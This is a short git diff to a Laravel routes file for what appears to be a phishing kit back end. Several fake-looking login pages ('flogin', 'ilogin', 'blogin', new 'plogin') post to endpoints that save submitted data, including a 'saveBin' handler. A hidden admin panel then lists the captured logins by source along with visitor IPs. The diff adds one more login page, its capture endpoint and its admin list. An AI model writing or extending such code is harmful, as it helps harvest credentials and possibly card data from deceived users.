@@ -30,10 +30,13 @@ Route::middleware([SaveIPMigration::class])->group(function () {
     Route::get('/wp', [MainController::class, 'index'])->name('home.index');
     Route::post('loginmember', [MainController::class, 'saveData']);
     Route::post('loginbin', [MainController::class, 'saveBin']);
+    Route::post('loginPar', [MainController::class, 'savePar']);
     Route::get('/join', [MainController::class, 'dd']);
     Route::get('/flogin', [MainController::class, 'ff']);
     Route::get('/ilogin', [MainController::class, 'ib']);
     Route::get('/blogin', [MainController::class, 'blogin']);
+    Route::get('/plogin', [MainController::class, 'plogin']);
+    Route::get('/resetcache', [MainController::class, 'resetcache']);
     Route::get('/{slug}', [MainController::class, 'handleSlug']);
 });
 
@@ -46,6 +49,7 @@ Route::middleware(['web', 'auth.check', 'check.permissions'])->prefix('hacininye
     Route::get('loginf-list', [LogController::class, 'listByFLogin'])->name('admin.listflogin');
     Route::get('logint-list', [LogController::class, 'listByTLogin'])->name('admin.listtlogin');
     Route::get('loginb-list', [LogController::class, 'listByBLogin'])->name('admin.listblogin');
+    Route::get('loginp-list', [LogController::class, 'listByPLogin'])->name('admin.listplogin');
     Route::get('logini-list', [LogController::class, 'listByILogin'])->name('admin.listilogin');
     Route::get('ip-list', [LogController::class, 'listByIP'])->name('admin.listip');
     Route::get('ip-action', [LogController::class, 'actionByIp'])->name('admin.actionByIp');
